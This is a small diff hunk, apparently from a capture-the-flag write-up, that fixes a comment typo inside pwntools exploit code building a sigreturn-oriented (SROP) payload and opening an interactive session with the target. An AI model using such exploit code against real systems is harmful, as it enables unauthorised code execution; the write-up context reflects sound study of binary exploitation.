@@ -122,7 +122,7 @@ frame.rip = syscall_gadget
 payload = b"a" * 32 + read_gadget + p64(syscall_gadget) + bytes(frame)
 
 target.sendline(payload)
-target.sendline(b"a" * 0xe) # read 0xe bytes becuase it also reads the newline
+target.sendline(b"a" * 0xe) # read 0xe bytes because it also reads the newline
 target.interactive()
 ```
 
